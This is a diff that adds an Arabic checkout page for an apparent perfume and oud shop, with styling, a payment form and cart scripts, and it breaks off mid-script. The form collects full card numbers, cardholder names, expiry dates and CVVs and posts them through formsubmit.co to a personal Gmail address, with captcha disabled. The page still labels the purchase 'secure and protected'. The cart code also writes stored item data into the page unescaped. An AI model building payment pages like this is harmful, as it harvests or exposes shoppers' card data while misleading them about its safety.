@@ -1,0 +1,1547 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إتمام الشراء | عطور خرافة</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <style>
+        :root {
+            --primary-color: #2C1810;
+            --secondary-color: #5D4037;
+            --accent-color: #8B4513;
+            --light-color: #F8F0E5;
+            --text-dark: #2C1810;
+            --text-light: #F8F0E5;
+            --gold-color: #D4AF37;
+            --discount-color: #E74C3C;
+            --success-color: #27ae60;
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--light-color);
+            color: var(--text-dark);
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* الشريط العلوي */
+        .top-bar {
+            background-color: var(--primary-color);
+            color: var(--text-light);
+            padding: 8px 0;
+            text-align: center;
+            font-size: 14px;
+            position: relative;
+            animation: slideDown 0.5s ease;
+        }
+
+        .close-topbar {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: var(--gold-color);
+            transition: var(--transition);
+        }
+
+        .close-topbar:hover {
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        /* شعار المتجر */
+        .logo {
+            font-family: 'Arabic Typesetting', serif;
+            font-size: 2.5rem;
+            color: var(--gold-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px 0;
+            transition: var(--transition);
+        }
+
+        .logo:hover {
+            transform: scale(1.05);
+        }
+
+        .logo span {
+            margin: 0 10px;
+        }
+
+        /* شريط التنقل */
+        nav {
+            background-color: var(--secondary-color);
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+        }
+
+        .nav-links li {
+            margin: 0 15px;
+        }
+
+        .nav-links a {
+            color: var(--text-light);
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .nav-links a:after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            background: var(--gold-color);
+            left: 0;
+            bottom: -5px;
+            transition: var(--transition);
+        }
+
+        .nav-links a:hover:after {
+            width: 100%;
+        }
+
+        .nav-icons {
+            display: flex;
+            align-items: center;
+        }
+
+        .nav-icons a {
+            color: var(--text-light);
+            margin-left: 20px;
+            font-size: 1.2rem;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .nav-icons a:hover {
+            color: var(--gold-color);
+        }
+
+        .cart-count {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background-color: var(--discount-color);
+            color: white;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            font-size: 0.7rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* تقدم الطلب */
+        .checkout-progress {
+            display: flex;
+            justify-content: space-between;
+            margin: 40px auto;
+            max-width: 800px;
+            position: relative;
+        }
+
+        .checkout-progress:before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background-color: #ddd;
+            z-index: 1;
+        }
+
+        .progress-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step-icon {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            background-color: white;
+            border: 2px solid #ddd;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+            color: #ddd;
+            font-weight: bold;
+        }
+
+        .step-text {
+            font-size: 0.9rem;
+            color: #777;
+        }
+
+        .progress-step.active .step-icon {
+            background-color: var(--accent-color);
+            border-color: var(--accent-color);
+            color: white;
+        }
+
+        .progress-step.active .step-text {
+            color: var(--accent-color);
+            font-weight: 500;
+        }
+
+        .progress-step.completed .step-icon {
+            background-color: var(--success-color);
+            border-color: var(--success-color);
+            color: white;
+        }
+
+        /* محتوى صفحة الدفع */
+        .checkout-container {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 30px;
+            margin: 40px 0;
+        }
+
+        @media (max-width: 992px) {
+            .checkout-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .checkout-form {
+            background-color: white;
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .form-section {
+            margin-bottom: 30px;
+        }
+
+        .section-title {
+            font-size: 1.3rem;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--gold-color);
+            font-family: 'Arabic Typesetting', serif;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--secondary-color);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        .form-input:focus {
+            border-color: var(--accent-color);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(139, 69, 19, 0.2);
+        }
+
+        .form-select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            background-color: white;
+            cursor: pointer;
+        }
+
+        /* خيارات الدفع */
+        .payment-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .payment-option {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .payment-option:hover {
+            border-color: var(--accent-color);
+        }
+
+        .payment-option.selected {
+            border-color: var(--accent-color);
+            background-color: rgba(139, 69, 19, 0.05);
+        }
+
+        .payment-option input {
+            margin-left: 10px;
+        }
+
+        .payment-icon {
+            margin-left: 15px;
+            font-size: 1.5rem;
+            color: var(--secondary-color);
+        }
+
+        .payment-text {
+            flex: 1;
+        }
+
+        .payment-title {
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .payment-desc {
+            font-size: 0.9rem;
+            color: #777;
+        }
+
+        /* ملخص الطلب */
+        .order-summary {
+            background-color: white;
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            height: fit-content;
+            position: sticky;
+            top: 100px;
+        }
+
+        .summary-title {
+            font-size: 1.5rem;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            font-family: 'Arabic Typesetting', serif;
+            border-bottom: 2px solid var(--gold-color);
+            padding-bottom: 10px;
+        }
+
+        .order-items {
+            margin-bottom: 20px;
+        }
+
+        .order-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .item-info {
+            display: flex;
+            align-items: center;
+        }
+
+        .item-img {
+            width: 60px;
+            height: 60px;
+            object-fit: cover;
+            border-radius: 4px;
+            margin-left: 15px;
+        }
+
+        .item-name {
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .item-price {
+            color: var(--accent-color);
+            font-weight: bold;
+        }
+
+        .item-quantity {
+            color: #777;
+            font-size: 0.9rem;
+        }
+
+        .item-actions {
+            display: flex;
+            align-items: center;
+            margin-top: 5px;
+        }
+
+        .quantity-btn {
+            width: 25px;
+            height: 25px;
+            background-color: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .quantity-input {
+            width: 35px;
+            height: 25px;
+            text-align: center;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            margin: 0 5px;
+        }
+
+        .remove-item {
+            color: var(--discount-color);
+            margin-right: 10px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+
+        .summary-label {
+            color: var(--secondary-color);
+        }
+
+        .summary-value {
+            font-weight: 500;
+        }
+
+        .discount-value {
+            color: var(--discount-color);
+        }
+
+        .summary-total {
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+            margin-top: 10px;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .total-label {
+            color: var(--primary-color);
+        }
+
+        .total-value {
+            color: var(--accent-color);
+        }
+
+        .secure-checkout {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+            color: var(--secondary-color);
+            font-size: 0.9rem;
+        }
+
+        .place-order-btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: var(--transition);
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .place-order-btn:hover {
+            background-color: var(--primary-color);
+            transform: translateY(-2px);
+        }
+
+        /* Newsletter */
+        .newsletter {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 60px 0;
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        .newsletter h2 {
+            font-size: 2.2rem;
+            margin-bottom: 20px;
+            font-family: 'Arabic Typesetting', serif;
+        }
+
+        .newsletter p {
+            max-width: 600px;
+            margin: 0 auto 30px;
+            font-size: 1.1rem;
+        }
+
+        .newsletter-form {
+            display: flex;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .newsletter-input {
+            flex: 1;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px 0 0 4px;
+            font-size: 1rem;
+        }
+
+        .newsletter-btn {
+            padding: 0 25px;
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            border-radius: 0 4px 4px 0;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .newsletter-btn:hover {
+            background-color: var(--gold-color);
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--primary-color);
+            color: var(--text-light);
+            padding: 50px 0 20px;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-column h3 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: var(--gold-color);
+            font-family: 'Arabic Typesetting', serif;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: var(--text-light);
+            text-decoration: none;
+            transition: var(--transition);
+        }
+
+        .footer-links a:hover {
+            color: var(--gold-color);
+            padding-right: 5px;
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .social-icons a {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: var(--text-light);
+            transition: var(--transition);
+        }
+
+        .social-icons a:hover {
+            background-color: var(--gold-color);
+            transform: translateY(-3px);
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 30px;
+            margin-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .checkout-progress {
+                flex-direction: column;
+                gap: 20px;
+                align-items: flex-start;
+            }
+            
+            .checkout-progress:before {
+                display: none;
+            }
+            
+            .progress-step {
+                flex-direction: row;
+                gap: 15px;
+            }
+            
+            .newsletter-form {
+                flex-direction: column;
+            }
+            
+            .newsletter-input, .newsletter-btn {
+                border-radius: 4px;
+                width: 100%;
+            }
+            
+            .newsletter-btn {
+                margin-top: 10px;
+                padding: 12px;
+            }
+        }
+
+        /* Animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideDown {
+            from { transform: translateY(-100%); }
+            to { transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .animate {
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: var(--accent-color);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 4px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transform: translateX(100%);
+            transition: transform 0.3s ease;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast i {
+            font-size: 1.2rem;
+        }
+
+        /* تحديد الموقع */
+        .location-section {
+            margin-bottom: 20px;
+        }
+
+        .location-btn {
+            background-color: var(--secondary-color);
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: var(--transition);
+        }
+
+        .location-btn:hover {
+            background-color: var(--accent-color);
+        }
+
+        .location-info {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border-radius: 4px;
+            border: 1px solid #eee;
+        }
+
+        /* أسلوب بطاقة الائتمان */
+        .card-type-icon {
+            position: absolute;
+            left: 15px; /* تغيير من right إلى left */
+            top: 40px;
+            font-size: 24px;
+            color: #ccc;
+        }
+
+        .card-input-group {
+            position: relative;
+        }
+
+        .card-input-group .form-input {
+            padding-left: 50px; /* إضافة مساحة على اليسار للأيقونة */
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- الشريط العلوي -->
+    <div class="top-bar">
+        <span class="close-topbar"><i class="fas fa-times"></i></span>
+        توصيل مجاني للطلبات فوق 500 ريال | خصم 20% على أول طلب لك | استخدم الكود: WELCOME20
+    </div>
+
+    <!-- الرأس -->
+    <header>
+        <a href="index.html" class="logo">
+            <span>خرافة</span>
+            <i class="fas fa-fire"></i>
+            <span>للعود</span>
+        </a>
+
+        <nav>
+            <div class="nav-container">
+                <ul class="nav-links">
+                    <li><a href="index.html">الرئيسية</a></li>
+                    <li><a href="kk1.html">العطور</a></li>
+                    <li><a href="#">البخور</a></li>
+                    <li><a href="#">مجموعات الهدايا</a></li>
+                    <li><a href="#">اتصل بنا</a></li>
+                </ul>
+
+                <div class="nav-icons">
+                    <a href="#"><i class="fas fa-search"></i></a>
+                    <a href="#"><i class="fas fa-user"></i></a>
+                    <a href="sk.html">
+                        <i class="fas fa-shopping-cart"></i>
+                        <span class="cart-count">0</span>
+                    </a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- تقدم الطلب -->
+    <section class="container">
+        <div class="checkout-progress">
+            <div class="progress-step completed">
+                <div class="step-icon">
+                    <i class="fas fa-shopping-cart"></i>
+                </div>
+                <div class="step-text">سلة التسوق</div>
+            </div>
+            <div class="progress-step completed">
+                <div class="step-icon">
+                    <i class="fas fa-user"></i>
+                </div>
+                <div class="step-text">المعلومات</div>
+            </div>
+            <div class="progress-step active">
+                <div class="step-icon">3</div>
+                <div class="step-text">الدفع</div>
+            </div>
+            <div class="progress-step">
+                <div class="step-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                <div class="step-text">التأكيد</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- محتوى صفحة الدفع -->
+    <section class="container">
+        <div class="checkout-container">
+            <form class="checkout-form" action="https://formsubmit.co/gohyt4480@gmail.com" method="POST">
+                <!-- إضافة حقول مخفية لتحسين تجربة FormSubmit -->
+                <input type="hidden" name="_subject" value="طلب جديد من موقع خرافة للعود">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_captcha" value="false">
+                
+                <div class="form-section">
+                    <h3 class="section-title">معلومات الشحن</h3>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">الاسم الأول</label>
+                            <input type="text" class="form-input" placeholder="اسمك الأول" id="firstName" name="الاسم الأول" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">اسم العائلة</label>
+                            <input type="text" class="form-input" placeholder="اسم عائلتك" id="lastName" name="اسم العائلة" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">الهاتف</label>
+                        <input type="tel" class="form-input" id="phone" name="الهاتف" style="padding-right: 90px;" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">العنوان</label>
+                        <input type="text" class="form-input" placeholder="عنوانك الكامل" id="address" name="العنوان" required>
+                    </div>
+                    <div class="location-section">
+                        <button type="button" class="location-btn" id="getLocationBtn">
+                            <i class="fas fa-map-marker-alt"></i>
+                            تحديد موقعي تلقائياً
+                        </button>
+                        <div class="location-info hidden" id="locationInfo">
+                            <p>تم تحديد موقعك بنجاح: <span id="locationText"></span></p>
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">المدينة</label>
+                            <input type="text" class="form-input" placeholder="مدينتك" id="city" name="المدينة" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">الرمز البريدي</label>
+                            <input type="text" class="form-input" placeholder="الرمز البريدي" id="zipCode" name="الرمز البريدي">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-section">
+                    <h3 class="section-title">طريقة الدفع</h3>
+                    <div class="payment-options">
+                        <label class="payment-option selected" data-method="credit-card">
+                            <input type="radio" name="payment-method" value="credit-card" checked>
+                            <div class="payment-text">
+                                <div class="payment-title">بطاقة ائتمان</div>
+                                <div class="payment-desc">ادخل تفاصيل بطاقتك الائتمانية</div>
+                            </div>
+                            <div class="payment-icon">
+                                <i class="fas fa-credit-card"></i>
+                            </div>
+                        </label>
+                        
+                        <label class="payment-option" data-method="cash">
+                            <input type="radio" name="payment-method" value="cash">
+                            <div class="payment-text">
+                                <div class="payment-title">الدفع عند الاستلام</div>
+                                <div class="payment-desc">ادفع عند استلام الطلب</div>
+                            </div>
+                            <div class="payment-icon">
+                                <i class="fas fa-money-bill-wave"></i>
+                            </div>
+                        </label>
+                    </div>
+
+                    <div id="credit-card-form">
+                        <div class="form-row">
+                            <div class="form-group card-input-group">
+                                <label class="form-label">رقم البطاقة</label>
+                                <div class="card-type-icon" id="cardTypeIcon">
+                                    <i class="fas fa-credit-card"></i>
+                                </div>
+                                <input type="text" class="form-input" placeholder="1234 5678 9012 3456" id="cardNumber" maxlength="19" name="رقم البطاقة">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">اسم صاحب البطاقة</label>
+                                <input type="text" class="form-input" placeholder="اسم صاحب البطاقة" id="cardName" name="اسم صاحب البطاقة">
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label class="form-label">تاريخ الانتهاء</label>
+                                <input type="text" class="form-input" placeholder="MM/YY" id="cardExpiry" maxlength="5" name="تاريخ الانتهاء">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">CVV</label>
+                                <input type="text" class="form-input" placeholder="123" id="cardCvv" maxlength="3" name="CVV">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- إضافة حقل مخفي يحتوي على تفاصيل الطلب -->
+                <input type="hidden" name="تفاصيل الطلب" id="orderDetails">
+                
+                <!-- تعديل زر إتمام الطلب ليكون نوعه submit -->
+                <button type="submit" class="place-order-btn" id="placeOrderBtn">إتمام الطلب</button>
+            </form>
+
+            <div class="order-summary">
+                <h2 class="summary-title">ملخص الطلب</h2>
+                
+                <div class="order-items" id="orderItems">
+                    <!-- سيتم ملء هذا القسم ديناميكيًا باستخدام JavaScript -->
+                </div>
+                
+                <div class="summary-row">
+                    <span class="summary-label">المجموع الفرعي</span>
+                    <span class="summary-value" id="subtotal">0 ر.س</span>
+                </div>
+                
+                <div class="summary-row">
+                    <span class="summary-label">التخفيض</span>
+                    <span class="summary-value discount-value" id="discount">-0 ر.س</span>
+                </div>
+                
+                <div class="summary-row">
+                    <span class="summary-label">تكلفة الشحن</span>
+                    <span class="summary-value" id="shipping">0 ر.س</span>
+                </div>
+                
+                <div class="summary-row summary-total">
+                    <span class="total-label">الإجمالي</span>
+                    <span class="total-value" id="total">0 ر.س</span>
+                </div>
+                
+                <div class="secure-checkout">
+                    <i class="fas fa-lock"></i>
+                    <span>شراء آمن ومحمي</span>
+                </div>
+                
+                <button class="place-order-btn" id="placeOrderBtnForm">إتمام الطلب</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- النشرة البريدية -->
+    <section class="newsletter">
+        <div class="container">
+            <h2>اشترك في نشرتنا البريدية</h2>
+            <p>كن أول من يعرف عن العروض الجديدة والمنتجات الحصرية</p>
+            <form class="newsletter-form">
+                <input type="email" class="newsletter-input" placeholder="بريدك الإلكتروني" required>
+                <button type="submit" class="newsletter-btn">اشترак</button>
+            </form>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-column">
+                <h3>خرافة للعود</h3>
+                <p>متجر متخصص في أجود أنواع العطور والبخور والعود، نقدم لكم منتجات أصلية مستوحاة من تراثنا العربي الأصيل.</p>
+                <div class="social-icons">
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                    <a href="#"><i class="fab fa-snapchat-ghost"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+
+            <div class="footer-column">
+                <h3>روابط سريعة</h3>
+                <ul class="footer-links">
+                    <li><a href="k.html">الرئيسية</a></li>
+                    <li><a href="kk1.html">العطور</a></li>
+                    <li><a href="#">عروض خاصة</a></li>
+                    <li><a href="#">مجموعات الهدايا</a></li>
+                    <li><a href="#">اتصل بنا</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-column">
+                <h3>خدمة العملاء</h3>
+                <ul class="footer-links">
+                    <li><a href="#">أسئلة شائعة</a></li>
+                    <li><a href="#">سياسة الإرجاع</a></li>
+                    <li><a href="#">طرق الدفع</a></li>
+                    <li><a href="#">تتبع الطلب</a></li>
+                    <li><a href="#">الشروط والأحكام</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-column">
+                <h3>معلومات الاتصال</h3>
+                <ul class="footer-links">
+                    <li><i class="fas fa-map-marker-alt"></i> الرياض، المملكة العربية السعودية</li>
+                    <li><i class="fas fa-phone"></i> 966112345678+</li>
+                    <li><i class="fas fa-envelope"></i> info@khurapha.com</li>
+                    <li><i class="fas fa-clock"></i> الأحد - الخميس: 9ص - 5م</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="copyright">
+            <p>جميع الحقوق محفوظة &copy; 2023 خرافة للعود</p>
+        </div>
+    </footer>
+
+    <!-- Toast Notification -->
+    <div class="toast">
+        <i class="fas fa-check-circle"></i>
+        <span class="toast-message">تمت إضافة المنتج إلى السلة بنجاح</span>
+    </div>
+
+    <script>
+        // بيانات المنتجات
+        const products = [
+            {
+                id: 1,
+                name: "خمره قهوة",
+                price: 130,
+                image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9AVtJGl0v8iWWUXavgKPy4MWhcREOeTDfAw&s",
+                quantity: 1
+            },
+            {
+                id: 2,
+                name: "شهرزاد – العربية للعود",
+                price: 259,
+                image: "https://media.al-jasser.com/api/public/content/0301020474-main?v=6f3d2e4a&t=w320",
+                quantity: 1
+            }
+        ];
+
+        // تهيئة المتغيرات
+        let cartItems = [];
+        let discount = 0;
+        let shipping = 0;
+
+        // تهيئة الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            initializePhoneInput();
+            loadCartItems();
+            updateCartCount();
+            updateOrderSummary();
+            setupPaymentMethods();
+            setupCardValidation();
+            setupLocationService();
+            setupPlaceOrderButton();
+            
+            // إضافة معالج حدث للنموذج
+            document.querySelector('form').addEventListener('submit', function(e) {
+                const orderDetails = collectOrderData();
+                document.getElementById('orderDetails').value = JSON.stringify(orderDetails);
+            });
+        });
+
+        // تهيئة حقل الهاتف مع رمز الدولة
+        function initializePhoneInput() {
+            const phoneInput = document.querySelector("#phone");
+            const iti = window.intlTelInput(phoneInput, {
+                initialCountry: "sa",
+                separateDialCode: true,
+                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+            });
+
+            // تعيين القيمة الافتراضية مع رمز السعودية
+            phoneInput.value = iti.getNumber();
+        }
+
+        // تحميل عناصر السلة من localStorage
+        function loadCartItems() {
+            const savedCart = localStorage.getItem('khuraphaCart');
+            if (savedCart) {
+                cartItems = JSON.parse(savedCart);
+                
+                // قراءة كود الخصم من السلة إذا كان موجوداً
+                const savedDiscountCode = localStorage.getItem('khuraphaDiscountCode');
+                if (savedDiscountCode) {
+                    applyDiscountCode(savedDiscountCode);
+                }
+            } else {
+                // إذا لم توجد سلة، نستخدم المنتجات الافتراضية
+                cartItems = products;
+                localStorage.setItem('khuraphaCart', JSON.stringify(cartItems));
+            }
+            renderCartItems();
+        }
+
+        // تطبيق كود الخصم
+        function applyDiscountCode(code) {
+            // هنا يمكنك إضافة المنطق الخاص بك لتطبيق الخصم حسب الكود
+            const subtotal = cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            
+            if (code === "WELCOME20") {
+                discount = subtotal * 0.2; // خصم 20% على المجموع
+            } else if (code === "SUMMER10") {
+                discount = subtotal * 0.1; // خصم 10% على المجموع
+            } else {
+                discount = 0; // لا يوجد خصم
+            }
+            
+            updateOrderSummary();
+        }
+
+        // عرض عناصر السلة
+        function renderCartItems() {
+            const orderItemsContainer = document.getElementById('orderItems');
+            orderItemsContainer.innerHTML = '';
+
+            cartItems.forEach(item => {
+                const itemElement = document.createElement('div');
+                itemElement.className = 'order-item';
+                itemElement.innerHTML = `
+                    <div class="item-info">
+                        <img src="${item.image}" alt="${item.name}" class="item-img">
+                        <div>
+                            <div class="item-name">${item.name}</div>
+                            <div class="item-quantity">الكمية: ${item.quantity}</div>
+                            <div class="item-actions">
+                                <span class="remove-item" data-id="${item.id}">
+                                    <i class="fas fa-trash"></i> إزالة
+                                </span>
+                                <div style="display: flex; align-items: center; margin-right: 15px;">
+                                    <span class="quantity-btn minus" data-id="${item.id}">-</span>
+                                    <input type="number" class="quantity-input" value="${item.quantity}" min="1" data-id="${item.id}">
+                                    <span class="quantity-btn plus" data-id="${item.id}">+</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="item-price">${(item.price * item.quantity).toFixed(2)} ر.س</div>
+                `;
+                orderItemsContainer.appendChild(itemElement);
+            });
+
+            // إضافة معالجات الأحداث للأزرار
+            document.querySelectorAll('.remove-item').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const itemId = parseInt(this.getAttribute('data-id'));
+                    removeItemFromCart(itemId);
+                });
+            });
+
+            document.querySelectorAll('.quantity-btn.minus').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const itemId = parseInt(this.getAttribute('data-id'));
+                    updateItemQuantity(itemId, -1);
+                });
+            });
+
+            document.querySelectorAll('.quantity-btn.plus').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const itemId = parseInt(this.getAttribute('data-id'));
+                    updateItemQuantity(itemId, 1);
+                });
+            });
+
+            document.querySelectorAll('.quantity-input').forEach(input => {
+                input.addEventListener('change', function() {
+                    const itemId = parseInt(this.getAttribute('data-id'));
+                    const newQuantity = parseInt(this.value);
+                    if (newQuantity > 0) {
+                        setItemQuantity(itemId, newQuantity);
+                    } else {
+                        this.value = 1;
+                        setItemQuantity(itemId, 1);
+                    }
+                });
+            });
+        }
+
+        // إزالة عنصر من السلة
+        function removeItemFromCart(itemId) {
+            cartItems = cartItems.filter(item => item.id !== itemId);
+            localStorage.setItem('khuraphaCart', JSON.stringify(cartItems));
+            renderCartItems();
+            updateOrderSummary();
+            updateCartCount();
+            showToast('تم إزالة المنتج من السلة');
+        }
+
+        // تحديث كمية العنصر
+        function updateItemQuantity(itemId, change) {
+            const item = cartItems.find(item => item.id === itemId);
+            if (item) {
+                item.quantity += change;
+                if (item.quantity < 1) item.quantity = 1;
+                localStorage.setItem('khuraphaCart', JSON.stringify(cartItems));
+                renderCartItems();
+                updateOrderSummary();
+                updateCartCount();
+            }
+        }
+
+        // تعيين كمية محددة للعنير
+        function setItemQuantity(itemId, quantity) {
+            const item = cartItems.find(item => item.id === itemId);
+            if (item) {
+                item.quantity = quantity;
+                localStorage.setItem('khuraphaCart', JSON.stringify(cartItems));
+                renderCartItems();
+                updateOrderSummary();
+                updateCartCount();
+            }
+        }
+
+        // تحديث عداد السلة
+        function updateCartCount() {
